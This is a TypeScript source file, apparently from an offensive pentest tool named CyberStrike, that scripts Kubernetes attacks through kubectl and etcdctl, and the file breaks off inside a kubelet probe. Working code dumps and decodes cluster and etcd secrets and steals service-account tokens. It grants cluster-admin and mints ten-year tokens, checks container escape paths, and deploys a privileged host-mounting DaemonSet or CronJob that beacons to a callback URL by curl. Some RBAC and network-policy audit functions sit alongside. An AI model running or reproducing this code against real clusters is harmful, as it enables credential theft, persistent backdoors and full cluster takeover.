import z from "zod"
import { Tool } from "./tool"

const PROGRAMS = {
  k8s_enum: {
    description:
      "Enumerate Kubernetes cluster: namespaces, pods, services, secrets (metadata), RBAC roles/bindings, ingress, and service accounts",
    args: "[--namespace NS] [--kubeconfig PATH] [--context CTX]",
  },
  k8s_secrets: {
    description:
      "Extract and base64-decode Kubernetes Secrets from all accessible namespaces. Filters by type (Opaque, TLS, docker-registry)",
    args: "[--namespace NS] [--type TYPE] [--kubeconfig PATH] [--context CTX]",
  },
  k8s_escape: {
    description:
      "Detect and exploit container escape vectors: privileged mode, hostPID/hostNetwork, writable hostPath, mounted docker socket, SYS_ADMIN capability",
    args: "[--exploit] [--kubeconfig PATH] [--context CTX]",
  },
  k8s_privesc: {
    description:
      "Kubernetes RBAC privilege escalation: steal ServiceAccount tokens, create ClusterRoleBinding for cluster-admin, abuse token request API",
    args: "--method <sa_token|bind_admin|token_request> [--namespace NS] [--sa-name NAME] [--kubeconfig PATH] [--context CTX]",
  },
  etcd_dump: {
    description:
      "Connect directly to etcd and extract all Kubernetes secrets from /registry/secrets/ prefix. Requires etcd credentials or certs",
    args: "--endpoint ENDPOINT [--cert CERT] [--key KEY] [--ca CA]",
  },
  k8s_backdoor: {
    description:
      "Deploy persistent backdoor via DaemonSet (runs on every node) or CronJob (periodic callback) with configurable image and callback URL",
    args: "--type <daemonset|cronjob> --image IMAGE [--callback-url URL] [--namespace NS] [--kubeconfig PATH] [--context CTX]",
  },
  k8s_rbac_audit: {
    description:
      "Deep RBAC analysis: find roles with dangerous verbs (create pods, exec, get secrets, escalate, bind, impersonate), wildcard resources/verbs, and overprivileged service accounts",
    args: "[--namespace NS] [--kubeconfig PATH] [--context CTX]",
  },
  k8s_network_policy: {
    description:
      "Audit NetworkPolicies: find namespaces with no policies (all traffic allowed), pods not selected by any policy, and overly permissive allow-all rules",
    args: "[--namespace NS] [--kubeconfig PATH] [--context CTX]",
  },
  helm_secrets: {
    description:
      "Extract secrets from Helm releases stored as Kubernetes secrets (type helm.sh/release.v1). Decodes release data and scans values for credentials",
    args: "[--namespace NS] [--release NAME] [--kubeconfig PATH] [--context CTX]",
  },
  kubelet_api: {
    description:
      "Probe kubelet API on port 10250 (authenticated) and 10255 (read-only). Enumerates pods, checks for unauthenticated exec access",
    args: "--target HOST [--port PORT]",
  },
  cloud_metadata: {
    description:
      "Access cloud provider metadata service from within a pod. Extracts IAM credentials, instance identity, and project info from AWS/GCP/Azure IMDS",
    args: "[--provider aws|gcp|azure|all]",
  },
  k8s_configmap: {
    description:
      "Dump ConfigMaps across namespaces and scan for connection strings, API endpoints, database URLs, and plaintext credentials",
    args: "[--namespace NS] [--kubeconfig PATH] [--context CTX]",
  },
  k8s_admission: {
    description:
      "Audit admission controllers and webhook configurations: MutatingWebhook, ValidatingWebhook, OPA Gatekeeper constraints, Kyverno policies. Find bypass vectors",
    args: "[--kubeconfig PATH] [--context CTX]",
  },
  k8s_pod_security: {
    description:
      "Audit Pod Security Standards enforcement: check PodSecurityAdmission labels, find namespaces running privileged workloads, identify PSS violations",
    args: "[--namespace NS] [--kubeconfig PATH] [--context CTX]",
  },
  k8s_service_account: {
    description:
      "Deep service account analysis: enumerate SA tokens, decode JWTs, check token audiences, find SAs with cluster-admin bindings, identify automountable tokens",
    args: "[--namespace NS] [--kubeconfig PATH] [--context CTX]",
  },
  k8s_ingress_audit: {
    description:
      "Audit Ingress/Gateway resources: TLS configuration, exposed paths, annotation-based exploits, backend service mapping, certificate extraction",
    args: "[--namespace NS] [--kubeconfig PATH] [--context CTX]",
  },
  k8s_pv_dump: {
    description:
      "Enumerate PersistentVolumes and PersistentVolumeClaims. Check for hostPath PVs, NFS shares, and extract data from accessible volumes",
    args: "[--namespace NS] [--kubeconfig PATH] [--context CTX]",
  },
  k8s_events: {
    description:
      "Extract Kubernetes events for intelligence gathering: failed auth attempts, image pull errors, scheduling failures, security warnings, OOM kills",
    args: "[--namespace NS] [--kubeconfig PATH] [--context CTX]",
  },
  k8s_exec: {
    description:
      "Execute commands in running pods for lateral movement. Lists exec-capable pods and runs commands across accessible containers",
    args: "--pod POD --cmd CMD [--namespace NS] [--container NAME] [--kubeconfig PATH] [--context CTX]",
  },
  cleanup_k8s: {
    description:
      "Remove all CyberStrike-created Kubernetes resources (by label app=cyberstrike): DaemonSets, CronJobs, ClusterRoleBindings, Pods. ALWAYS run before leaving",
    args: "[--kubeconfig PATH] [--context CTX] [--dry-run]",
  },
} as const satisfies Record<string, { description: string; args: string }>

type Program = keyof typeof PROGRAMS
type Finding = {
  checkId: string
  provider: string
  severity: string
  status: string
  resource: string
  title: string
  details: string
  remediation: string
}
type HookResult = { output: string; findings: Finding[] }

// ── CLI helpers ──

async function run(
  cmd: string,
  args: string[],
  timeout: number,
): Promise<{ stdout: string; stderr: string; exitCode: number }> {
  let proc: ReturnType<typeof Bun.spawn>
  try {
    proc = Bun.spawn([cmd, ...args], { stdout: "pipe", stderr: "pipe", env: { ...process.env } })
  } catch (e) {
    return { stdout: "", stderr: e instanceof Error ? e.message : String(e), exitCode: 127 }
  }
  const ms = timeout * 1000
  let killed = false
  const timer = setTimeout(() => {
    killed = true
    proc.kill(9)
  }, ms)
  const reads = Promise.all([
    new Response(proc.stdout as ReadableStream).text(),
    new Response(proc.stderr as ReadableStream).text(),
  ])
  const [stdout, stderr] = await Promise.race([
    reads,
    new Promise<[string, string]>((r) => setTimeout(() => r(["", "(timed out)"]), ms + 2000)),
  ])
  clearTimeout(timer)
  const exitCode = killed ? 124 : await proc.exited
  return { stdout, stderr, exitCode }
}

function argVal(args: string[], flag: string): string | undefined {
  const i = args.indexOf(flag)
  return i >= 0 && i + 1 < args.length ? args[i + 1] : undefined
}

function tryJson(s: string) {
  try {
    return JSON.parse(s)
  } catch {
    return null
  }
}

function kc(args: string[], kubeconfig: string | undefined, ctx: string | undefined, timeout: number) {
  const extra = [...(kubeconfig ? ["--kubeconfig", kubeconfig] : []), ...(ctx ? ["--context", ctx] : [])]
  return run("kubectl", [...args, ...extra, "-o", "json"], timeout)
}

function kcText(args: string[], kubeconfig: string | undefined, ctx: string | undefined, timeout: number) {
  const extra = [...(kubeconfig ? ["--kubeconfig", kubeconfig] : []), ...(ctx ? ["--context", ctx] : [])]
  return run("kubectl", [...args, ...extra], timeout)
}

// ── Programs ──

async function k8sEnum(args: string[], timeout: number): Promise<HookResult> {
  const kubeconfig = argVal(args, "--kubeconfig")
  const ctx = argVal(args, "--context")
  const ns = argVal(args, "--namespace")
  const findings: Finding[] = []
  const output: string[] = ["[*] Enumerating Kubernetes cluster...\n"]

  const clusterInfo = await kcText(["cluster-info"], kubeconfig, ctx, timeout)
  if (clusterInfo.exitCode === 0) output.push(`[+] Cluster info:\n${clusterInfo.stdout}\n`)

  const whoami = await kcText(["auth", "whoami"], kubeconfig, ctx, timeout)
  if (whoami.exitCode === 0) output.push(`[+] Current identity:\n${whoami.stdout}\n`)

  const nsResult = await kc(["get", "namespaces"], kubeconfig, ctx, timeout)
  const namespaces = nsResult.exitCode === 0 ? tryJson(nsResult.stdout)?.items || [] : []
  output.push(`[+] Namespaces: ${namespaces.length}`)
  for (const n of namespaces) output.push(`    ${n.metadata.name} (${n.status?.phase})`)

  const targetNs = ns ? [ns] : namespaces.map((n: Record<string, Record<string, string>>) => n.metadata.name)
  for (const n of targetNs) {
    output.push(`\n${"─".repeat(40)}\n[*] Namespace: ${n}`)

    const pods = await kc(["get", "pods", "-n", n], kubeconfig, ctx, timeout)
    if (pods.exitCode === 0) {
      const items = tryJson(pods.stdout)?.items || []
      output.push(`  Pods: ${items.length}`)
      for (const p of items) {
        const containers = (p.spec?.containers || []).map((c: Record<string, string>) => c.name).join(",")
        output.push(`    ${p.metadata.name} (${p.status?.phase}) — containers: ${containers}`)
      }
    }

    const svcs = await kc(["get", "services", "-n", n], kubeconfig, ctx, timeout)
    if (svcs.exitCode === 0) {
      const items = tryJson(svcs.stdout)?.items || []
      output.push(`  Services: ${items.length}`)
      for (const s of items) {
        const ports = (s.spec?.ports || [])
          .map((p: Record<string, string | number>) => `${p.port}/${p.protocol}`)
          .join(",")
        output.push(`    ${s.metadata.name} (${s.spec?.type}) — ${ports}`)
      }
    }

    const secrets = await kc(["get", "secrets", "-n", n], kubeconfig, ctx, timeout)
    if (secrets.exitCode === 0) {
      const items = tryJson(secrets.stdout)?.items || []
      output.push(`  Secrets: ${items.length}`)
      for (const s of items)
        output.push(`    ${s.metadata.name} (${s.type}) — ${Object.keys(s.data || {}).length} key(s)`)
    }

    const sas = await kc(["get", "serviceaccounts", "-n", n], kubeconfig, ctx, timeout)
    if (sas.exitCode === 0) {
      const items = tryJson(sas.stdout)?.items || []
      output.push(`  ServiceAccounts: ${items.length}`)
      for (const sa of items) output.push(`    ${sa.metadata.name}`)
    }

    const ingresses = await kc(["get", "ingresses", "-n", n], kubeconfig, ctx, timeout)
    if (ingresses.exitCode === 0) {
      const items = tryJson(ingresses.stdout)?.items || []
      if (items.length > 0) {
        output.push(`  Ingresses: ${items.length}`)
        for (const ing of items) {
          const hosts = (ing.spec?.rules || []).map((r: Record<string, string>) => r.host || "*").join(",")
          output.push(`    ${ing.metadata.name} — hosts: ${hosts}`)
        }
      }
    }
  }

  const crbs = await kc(["get", "clusterrolebindings"], kubeconfig, ctx, timeout)
  if (crbs.exitCode === 0) {
    const items = tryJson(crbs.stdout)?.items || []
    output.push(`\n[+] ClusterRoleBindings: ${items.length}`)
    for (const b of items) {
      if (b.metadata.name.startsWith("system:")) continue
      const subjects = (b.subjects || []).map((s: Record<string, string>) => `${s.kind}/${s.name}`).join(",")
      output.push(`    ${b.metadata.name} → ${b.roleRef.name} — ${subjects}`)
      if (b.roleRef.name === "cluster-admin") {
        for (const s of b.subjects || []) {
          if (s.name === "system:masters") continue
          findings.push({
            checkId: "K8S-ENUM-001",
            provider: "kubernetes",
            severity: "critical",
            status: "FAIL",
            resource: `ClusterRoleBinding/${b.metadata.name}`,
            title: `cluster-admin bound to ${s.kind}/${s.name}`,
            details: `${s.kind} "${s.name}" has cluster-admin privileges.`,
            remediation: "Review if cluster-admin is necessary for this identity.",
          })
        }
      }
    }
  }

  return { output: output.join("\n"), findings }
}

async function k8sSecrets(args: string[], timeout: number): Promise<HookResult> {
  const kubeconfig = argVal(args, "--kubeconfig")
  const ctx = argVal(args, "--context")
  const ns = argVal(args, "--namespace")
  const filterType = argVal(args, "--type")
  const output: string[] = ["[*] Extracting Kubernetes secrets...\n"]

  const nsResult = await kc(["get", "namespaces"], kubeconfig, ctx, timeout)
  const namespaces = ns
    ? [ns]
    : nsResult.exitCode === 0
      ? (tryJson(nsResult.stdout)?.items || []).map((n: Record<string, Record<string, string>>) => n.metadata.name)
      : ["default"]

  let total = 0
  for (const n of namespaces) {
    const secrets = await kc(["get", "secrets", "-n", n], kubeconfig, ctx, timeout)
    if (secrets.exitCode !== 0) continue
    const items = tryJson(secrets.stdout)?.items || []
    for (const s of items) {
      if (filterType && s.type !== filterType) continue
      if (s.type === "kubernetes.io/service-account-token" && !filterType) continue
      total++
      output.push(`\n[+] ${n}/${s.metadata.name} (${s.type})`)
      const data = s.data || {}
      for (const [key, val] of Object.entries(data)) {
        const decoded = Buffer.from(String(val), "base64").toString("utf-8")
        const preview = decoded.length > 200 ? decoded.slice(0, 200) + "..." : decoded
        output.push(`    ${key}: ${preview}`)
      }
    }
  }

  output.push(`\n[*] Total extracted: ${total} secret(s)`)
  return { output: output.join("\n"), findings: [] }
}

async function k8sEscape(args: string[], timeout: number): Promise<HookResult> {
  const kubeconfig = argVal(args, "--kubeconfig")
  const ctx = argVal(args, "--context")
  const exploit = args.includes("--exploit")
  const findings: Finding[] = []
  const output: string[] = ["[*] Scanning for container escape vectors...\n"]

  const pods = await kc(["get", "pods", "--all-namespaces"], kubeconfig, ctx, timeout)
  if (pods.exitCode !== 0) return { output: output.join("\n") + "[-] Cannot list pods", findings }

  const items = tryJson(pods.stdout)?.items || []
  for (const pod of items) {
    const ns = pod.metadata.namespace
    const name = pod.metadata.name
    const spec = pod.spec || {}
    const vectors: string[] = []

    if (spec.hostPID) vectors.push("hostPID")
    if (spec.hostNetwork) vectors.push("hostNetwork")
    if (spec.hostIPC) vectors.push("hostIPC")

    const containers = [...(spec.containers || []), ...(spec.initContainers || [])]
    for (const c of containers) {
      const sc = c.securityContext || {}
      if (sc.privileged) vectors.push(`privileged(${c.name})`)
      const caps = sc.capabilities?.add || []
      if (caps.includes("SYS_ADMIN")) vectors.push(`SYS_ADMIN(${c.name})`)
      if (caps.includes("SYS_PTRACE")) vectors.push(`SYS_PTRACE(${c.name})`)
    }

    const volumes = spec.volumes || []
    for (const v of volumes) {
      if (v.hostPath?.path === "/var/run/docker.sock") vectors.push("docker.sock")
      if (v.hostPath?.path === "/") vectors.push("hostPath:/")
      if (v.hostPath?.path === "/etc") vectors.push("hostPath:/etc")
    }

    if (vectors.length > 0) {
      output.push(`[!] ${ns}/${name}: ${vectors.join(", ")}`)
      findings.push({
        checkId: "K8S-ESC-001",
        provider: "kubernetes",
        severity: "critical",
        status: "FAIL",
        resource: `${ns}/Pod/${name}`,
        title: `Container escape vectors: ${vectors.join(", ")}`,
        details: `Pod "${name}" has ${vectors.length} escape vector(s). ${exploit ? "Exploit mode enabled." : "Use --exploit to attempt breakout."}`,
        remediation: "Remove privileged mode, dangerous capabilities, and sensitive hostPath mounts.",
      })
    }
  }

  if (exploit) {
    output.push("\n[*] Exploit mode — checking local pod environment...")
    const saToken = await run("cat", ["/var/run/secrets/kubernetes.io/serviceaccount/token"], 5)
    if (saToken.exitCode === 0) {
      output.push(`[+] ServiceAccount token found: ${saToken.stdout.slice(0, 40)}...`)
    }
    const dockerSock = await run("ls", ["-la", "/var/run/docker.sock"], 5)
    if (dockerSock.exitCode === 0) {
      output.push("[+] Docker socket accessible! Can create privileged containers.")
    }
    const procCheck = await run("ls", ["/proc/1/root"], 5)
    if (procCheck.exitCode === 0) {
      output.push("[+] Can access host PID 1 root — host filesystem breakout possible")
    }
  }

  output.push(`\n[*] Scan complete: ${findings.length} pod(s) with escape vectors`)
  return { output: output.join("\n"), findings }
}

async function k8sPrivesc(args: string[], timeout: number): Promise<HookResult> {
  const kubeconfig = argVal(args, "--kubeconfig")
  const ctx = argVal(args, "--context")
  const method = argVal(args, "--method")
  const ns = argVal(args, "--namespace") || "default"
  const saName = argVal(args, "--sa-name")
  const output: string[] = []

  if (!method) return { output: "[-] --method required: sa_token, bind_admin, or token_request", findings: [] }

  if (method === "sa_token") {
    output.push("[*] Stealing ServiceAccount tokens...\n")
    const nsResult = await kc(["get", "namespaces"], kubeconfig, ctx, timeout)
    const namespaces =
      nsResult.exitCode === 0
        ? (tryJson(nsResult.stdout)?.items || []).map((n: Record<string, Record<string, string>>) => n.metadata.name)
        : [ns]
    for (const n of namespaces) {
      const secrets = await kc(["get", "secrets", "-n", n], kubeconfig, ctx, timeout)
      if (secrets.exitCode !== 0) continue
      const items = tryJson(secrets.stdout)?.items || []
      for (const s of items) {
        if (s.type !== "kubernetes.io/service-account-token") continue
        const token = s.data?.token ? Buffer.from(s.data.token, "base64").toString("utf-8") : ""
        if (token) {
          output.push(`[+] ${n}/${s.metadata.name}:`)
          output.push(`    SA: ${s.metadata.annotations?.["kubernetes.io/service-account.name"] || "unknown"}`)
          output.push(`    Token: ${token.slice(0, 50)}...`)
        }
      }
    }
  }

  if (method === "bind_admin") {
    output.push("[*] Creating cluster-admin binding...\n")
    const target = saName || "default"
    const bindingName = `cs-admin-${Date.now()}`
    const create = await kcText(
      ["create", "clusterrolebinding", bindingName, "--clusterrole=cluster-admin", `--serviceaccount=${ns}:${target}`],
      kubeconfig,
      ctx,
      timeout,
    )
    output.push(
      create.exitCode === 0
        ? `[+] ClusterRoleBinding "${bindingName}" created — ${ns}:${target} is now cluster-admin`
        : `[-] Failed: ${create.stderr.slice(0, 200)}`,
    )
  }

  if (method === "token_request") {
    output.push("[*] Requesting token via TokenRequest API...\n")
    const target = saName || "default"
    const tokenReq = await run(
      "kubectl",
      [
        "create",
        "token",
        target,
        "-n",
        ns,
        "--duration=87600h",
        ...(kubeconfig ? ["--kubeconfig", kubeconfig] : []),
        ...(ctx ? ["--context", ctx] : []),
      ],
      timeout,
    )
    output.push(
      tokenReq.exitCode === 0
        ? `[+] Token for ${ns}/${target}:\n${tokenReq.stdout.slice(0, 80)}...`
        : `[-] Failed: ${tokenReq.stderr.slice(0, 200)}`,
    )
  }

  return { output: output.join("\n"), findings: [] }
}

async function etcdDump(args: string[], timeout: number): Promise<HookResult> {
  const endpoint = argVal(args, "--endpoint")
  const cert = argVal(args, "--cert")
  const key = argVal(args, "--key")
  const ca = argVal(args, "--ca")
  const output: string[] = []

  if (!endpoint) return { output: "[-] --endpoint required (e.g. https://etcd-host:2379)", findings: [] }

  output.push(`[*] Connecting to etcd at ${endpoint}...\n`)

  if (!Bun.which("etcdctl"))
    return { output: output.join("\n") + "[-] etcdctl not found. Install etcd client tools.", findings: [] }

  const etcdArgs = [
    "--endpoints",
    endpoint,
    ...(cert ? ["--cert", cert] : []),
    ...(key ? ["--key", key] : []),
    ...(ca ? ["--cacert", ca] : []),
  ]

  const health = await run("etcdctl", [...etcdArgs, "endpoint", "health"], timeout)
  output.push(
    health.exitCode === 0
      ? `[+] etcd healthy: ${health.stdout.trim()}`
      : `[-] Health check failed: ${health.stderr.slice(0, 200)}`,
  )

  output.push("\n[*] Extracting secrets from /registry/secrets/...")
  const secrets = await run("etcdctl", [...etcdArgs, "get", "/registry/secrets/", "--prefix", "--keys-only"], timeout)
  if (secrets.exitCode === 0) {
    const keys = secrets.stdout.split("\n").filter(Boolean)
    output.push(`[+] Found ${keys.length} secret key(s)`)
    for (const k of keys.slice(0, 50)) {
      output.push(`    ${k}`)
      const val = await run("etcdctl", [...etcdArgs, "get", k, "--print-value-only"], timeout)
      if (val.exitCode === 0 && val.stdout.trim()) {
        output.push(`      Value: ${val.stdout.trim().slice(0, 100)}...`)
      }
    }
    if (keys.length > 50) output.push(`    ... and ${keys.length - 50} more`)
  } else {
    output.push(`[-] Failed to read secrets: ${secrets.stderr.slice(0, 200)}`)
  }

  return { output: output.join("\n"), findings: [] }
}

async function k8sBackdoor(args: string[], timeout: number): Promise<HookResult> {
  const kubeconfig = argVal(args, "--kubeconfig")
  const ctx = argVal(args, "--context")
  const type = argVal(args, "--type")
  const image = argVal(args, "--image")
  const callbackUrl = argVal(args, "--callback-url")
  const ns = argVal(args, "--namespace") || "default"
  const output: string[] = []

  if (!type) return { output: "[-] --type required: daemonset or cronjob", findings: [] }
  if (!image) return { output: "[-] --image required (container image for backdoor)", findings: [] }

  if (type === "daemonset") {
    const name = `cs-monitor-${Date.now().toString(36).slice(-6)}`
    const cmd = callbackUrl
      ? `while true; do curl -s -X POST ${callbackUrl} -d "host=$(hostname)&ns=${ns}&type=daemonset"; sleep 3600; done`
      : "sleep infinity"
    const manifest = JSON.stringify({
      apiVersion: "apps/v1",
      kind: "DaemonSet",
      metadata: { name, namespace: ns, labels: { app: "cyberstrike" } },
      spec: {
        selector: { matchLabels: { app: "cyberstrike", component: name } },
        template: {
          metadata: { labels: { app: "cyberstrike", component: name } },
          spec: {
            containers: [
              {
                name: "agent",
                image,
                command: ["/bin/sh", "-c", cmd],
                securityContext: { privileged: true },
                volumeMounts: [{ name: "host", mountPath: "/host", readOnly: false }],
              },
            ],
            volumes: [{ name: "host", hostPath: { path: "/", type: "Directory" } }],
            hostPID: true,
            hostNetwork: true,
          },
        },
      },
    })

    const tmpFile = `/tmp/cs-ds-${Date.now()}.json`
    await Bun.write(tmpFile, manifest)
    output.push(`[*] Deploying DaemonSet "${name}" to ${ns}...`)
    const apply = await kcText(["apply", "-f", tmpFile], kubeconfig, ctx, timeout)
    await run("rm", ["-f", tmpFile], 5)
    output.push(
      apply.exitCode === 0
        ? `[+] DaemonSet deployed — runs on every node with host access`
        : `[-] Failed: ${apply.stderr.slice(0, 200)}`,
    )
  }

  if (type === "cronjob") {
    const name = `cs-health-${Date.now().toString(36).slice(-6)}`
    const cmd = callbackUrl
      ? `curl -s -X POST ${callbackUrl} -d "host=$(hostname)&ns=${ns}&type=cronjob"`
      : "echo heartbeat"
    const manifest = JSON.stringify({
      apiVersion: "batch/v1",
      kind: "CronJob",
      metadata: { name, namespace: ns, labels: { app: "cyberstrike" } },
      spec: {
        schedule: "*/30 * * * *",
        jobTemplate: {
          spec: {
            template: {
              metadata: { labels: { app: "cyberstrike", component: name } },
              spec: {
                containers: [
                  {
                    name: "callback",
                    image,
                    command: ["/bin/sh", "-c", cmd],
                  },
                ],
                restartPolicy: "Never",
              },
            },
          },
        },
      },
    })

    const tmpFile = `/tmp/cs-cj-${Date.now()}.json`
    await Bun.write(tmpFile, manifest)
    output.push(`[*] Deploying CronJob "${name}" to ${ns}...`)
    const apply = await kcText(["apply", "-f", tmpFile], kubeconfig, ctx, timeout)
    await run("rm", ["-f", tmpFile], 5)
    output.push(
      apply.exitCode === 0
        ? `[+] CronJob deployed — runs every 30 minutes`
        : `[-] Failed: ${apply.stderr.slice(0, 200)}`,
    )
  }

  return { output: output.join("\n"), findings: [] }
}

async function k8sRbacAudit(args: string[], timeout: number): Promise<HookResult> {
  const kubeconfig = argVal(args, "--kubeconfig")
  const ctx = argVal(args, "--context")
  const ns = argVal(args, "--namespace")
  const findings: Finding[] = []
  const output: string[] = ["[*] Auditing Kubernetes RBAC...\n"]

  const dangerousVerbs = ["create", "update", "patch", "delete", "escalate", "bind", "impersonate"]
  const sensitiveResources = [
    "secrets",
    "pods/exec",
    "pods/attach",
    "serviceaccounts/token",
    "clusterroles",
    "clusterrolebindings",
  ]

  const clusterRoles = await kc(["get", "clusterroles"], kubeconfig, ctx, timeout)
  if (clusterRoles.exitCode === 0) {
    const items = tryJson(clusterRoles.stdout)?.items || []
    output.push(`[+] ClusterRoles: ${items.length}\n`)
    for (const role of items) {
      if (role.metadata.name.startsWith("system:")) continue
      const rules = role.rules || []
      for (const rule of rules) {
        const verbs = rule.verbs || []
        const resources = rule.resources || []
        const apiGroups = rule.apiGroups || []
        if (verbs.includes("*") && resources.includes("*")) {
          output.push(`  [!] ${role.metadata.name}: wildcard verbs+resources (cluster-admin equivalent)`)
          findings.push({
            checkId: "K8S-RBAC-001",
            provider: "kubernetes",
            severity: "critical",
            status: "FAIL",
            resource: `ClusterRole/${role.metadata.name}`,
            title: `Wildcard ClusterRole: ${role.metadata.name}`,
            details: `apiGroups: ${apiGroups.join(",")}, resources: *, verbs: *`,
            remediation: "Replace wildcards with specific resources and verbs",
          })
          continue
        }
        const dangerous = verbs.filter((v: string) => dangerousVerbs.includes(v))
        const sensitive = resources.filter((r: string) => sensitiveResources.includes(r))
        if (dangerous.length > 0 && sensitive.length > 0) {
          output.push(`  [!] ${role.metadata.name}: ${dangerous.join(",")} on ${sensitive.join(",")}`)
          findings.push({
            checkId: "K8S-RBAC-002",
            provider: "kubernetes",
            severity: "high",
            status: "FAIL",
            resource: `ClusterRole/${role.metadata.name}`,
            title: `Dangerous permissions: ${role.metadata.name}`,
            details: `Verbs: ${dangerous.join(",")}, Resources: ${sensitive.join(",")}`,
            remediation: "Follow least privilege — restrict dangerous verbs on sensitive resources",
          })
        }
      }
    }
  }

  const scope = ns ? [ns] : ["default"]
  if (!ns) {
    const nsResult = await kc(["get", "namespaces"], kubeconfig, ctx, timeout)
    if (nsResult.exitCode === 0) {
      const items = tryJson(nsResult.stdout)?.items || []
      scope.length = 0
      scope.push(...items.map((n: Record<string, Record<string, string>>) => n.metadata.name))
    }
  }

  for (const n of scope) {
    const roles = await kc(["get", "roles", "-n", n], kubeconfig, ctx, timeout)
    if (roles.exitCode !== 0) continue
    const items = tryJson(roles.stdout)?.items || []
    for (const role of items) {
      const rules = role.rules || []
      for (const rule of rules) {
        if ((rule.verbs || []).includes("*") && (rule.resources || []).includes("*")) {
          output.push(`  [!] ${n}/Role/${role.metadata.name}: wildcard permissions`)
          findings.push({
            checkId: "K8S-RBAC-001",
            provider: "kubernetes",
            severity: "high",
            status: "FAIL",
            resource: `${n}/Role/${role.metadata.name}`,
            title: `Wildcard Role in ${n}: ${role.metadata.name}`,
            details: `Role has * verbs on * resources in namespace ${n}`,
            remediation: "Scope to specific resources and verbs",
          })
        }
      }
    }
  }

  output.push(`\n[*] RBAC audit complete: ${findings.length} issue(s) found`)
  return { output: output.join("\n"), findings }
}

async function k8sNetworkPolicy(args: string[], timeout: number): Promise<HookResult> {
  const kubeconfig = argVal(args, "--kubeconfig")
  const ctx = argVal(args, "--context")
  const ns = argVal(args, "--namespace")
  const findings: Finding[] = []
  const output: string[] = ["[*] Auditing Kubernetes NetworkPolicies...\n"]

  const nsResult = await kc(["get", "namespaces"], kubeconfig, ctx, timeout)
  const namespaces = ns
    ? [ns]
    : nsResult.exitCode === 0
      ? (tryJson(nsResult.stdout)?.items || []).map((n: Record<string, Record<string, string>>) => n.metadata.name)
      : ["default"]

  for (const n of namespaces) {
    const policies = await kc(["get", "networkpolicies", "-n", n], kubeconfig, ctx, timeout)
    const items = policies.exitCode === 0 ? tryJson(policies.stdout)?.items || [] : []

    if (items.length === 0) {
      output.push(`  [!] ${n}: NO NetworkPolicies — all pod-to-pod traffic allowed`)
      findings.push({
        checkId: "K8S-NETPOL-001",
        provider: "kubernetes",
        severity: "high",
        status: "FAIL",
        resource: `namespace/${n}`,
        title: `No NetworkPolicies in namespace: ${n}`,
        details: `All ingress/egress traffic is permitted between pods`,
        remediation: "Create default-deny NetworkPolicy and whitelist required traffic",
      })
      continue
    }

    output.push(`  ${n}: ${items.length} NetworkPolicy(ies)`)
    for (const pol of items) {
      const spec = pol.spec || {}
      const ingress = spec.ingress || []
      const egress = spec.egress || []

      if (ingress.length === 1 && Object.keys(ingress[0]).length === 0) {
        output.push(`    [!] ${pol.metadata.name}: allows ALL ingress`)
        findings.push({
          checkId: "K8S-NETPOL-002",
          provider: "kubernetes",
          severity: "medium",
          status: "FAIL",
          resource: `${n}/NetworkPolicy/${pol.metadata.name}`,
          title: `Allow-all ingress: ${pol.metadata.name}`,
          details: `Policy has empty ingress rule = allow all`,
          remediation: "Restrict ingress to specific pod selectors or CIDR blocks",
        })
      }
      if (egress.length === 1 && Object.keys(egress[0]).length === 0) {
        output.push(`    [!] ${pol.metadata.name}: allows ALL egress`)
      }

      const selector = spec.podSelector?.matchLabels || {}
      if (Object.keys(selector).length === 0 && !spec.podSelector?.matchExpressions) {
        output.push(`    ${pol.metadata.name}: applies to ALL pods in ${n}`)
      }
    }
  }

  output.push(`\n[*] Network policy audit complete: ${findings.length} issue(s)`)
  return { output: output.join("\n"), findings }
}

async function helmSecrets(args: string[], timeout: number): Promise<HookResult> {
  const kubeconfig = argVal(args, "--kubeconfig")
  const ctx = argVal(args, "--context")
  const ns = argVal(args, "--namespace")
  const release = argVal(args, "--release")
  const output: string[] = ["[*] Extracting Helm release secrets...\n"]
  const findings: Finding[] = []

  const secretPattern =
    /(?:password|secret|api[_-]?key|token|credential|private[_-]?key|database[_-]?url|connection[_-]?string)/i

  const nsResult = await kc(["get", "namespaces"], kubeconfig, ctx, timeout)
  const namespaces = ns
    ? [ns]
    : nsResult.exitCode === 0
      ? (tryJson(nsResult.stdout)?.items || []).map((n: Record<string, Record<string, string>>) => n.metadata.name)
      : ["default"]

  let total = 0
  for (const n of namespaces) {
    const filter = release ? `-l name=${release}` : ""
    const secrets = await kc(
      ["get", "secrets", "-n", n, "--field-selector", "type=helm.sh/release.v1", ...(filter ? [filter] : [])],
      kubeconfig,
      ctx,
      timeout,
    )
    if (secrets.exitCode !== 0) continue
    const items = tryJson(secrets.stdout)?.items || []
    if (items.length === 0) continue

    output.push(`\n[+] ${n}: ${items.length} Helm release(s)`)
    for (const s of items) {
      total++
      const releaseName = s.metadata.labels?.name || s.metadata.name
      const version = s.metadata.labels?.version || "?"
      output.push(`\n  Release: ${releaseName} (v${version})`)

      const releaseData = s.data?.release
      if (!releaseData) continue

      const decoded = Buffer.from(String(releaseData), "base64").toString("utf-8")
      let decompressed = decoded
      try {
        const buf = Buffer.from(decoded, "base64")
        const ds = new DecompressionStream("gzip")
        const writer = ds.writable.getWriter()
        writer.write(buf)
        writer.close()
        const reader = ds.readable.getReader()
        const chunks: Uint8Array[] = []
        let chunk = await reader.read()
        while (!chunk.done) {
          chunks.push(chunk.value)
          chunk = await reader.read()
        }
        decompressed = Buffer.concat(chunks).toString("utf-8")
      } catch {
        // not gzipped, use decoded directly
      }

      const releaseObj = tryJson(decompressed)
      if (!releaseObj) continue

      const config = releaseObj.config || {}
      const configStr = JSON.stringify(config, null, 2)
      const configLines = configStr.split("\n")
      for (const line of configLines) {
        if (secretPattern.test(line)) {
          output.push(`    [!] ${line.trim().substring(0, 150)}`)
          findings.push({
            checkId: "K8S-HELM-001",
            provider: "kubernetes",
            severity: "high",
            status: "EXTRACTED",
            resource: `${n}/helm/${releaseName}`,
            title: `Secret in Helm values: ${releaseName}`,
            details: line.trim().substring(0, 300),
            remediation: "Use external secrets or sealed-secrets instead of plaintext Helm values",
          })
        }
      }
    }
  }

  output.push(`\n[*] Total Helm releases scanned: ${total}`)
  return { output: output.join("\n"), findings }
}

async function kubeletApi(args: string[], timeout: number): Promise<HookResult> {
  const target = argVal(args, "--target")
  const port = argVal(args, "--port")
  const findings: Finding[] = []
  const output: string[] = []

  if (!target) return { output: "[!] Required: --target HOST", findings }

  const ports = port ? [port] : ["10250", "10255"]

  for (const p of ports) {
    const scheme = p === "10255" ? "http" : "https"
    const base = `${scheme}://${target}:${p}`
    output.push(`[*] Probing kubelet API at ${base}...\n`)

    if (p === "10255") {
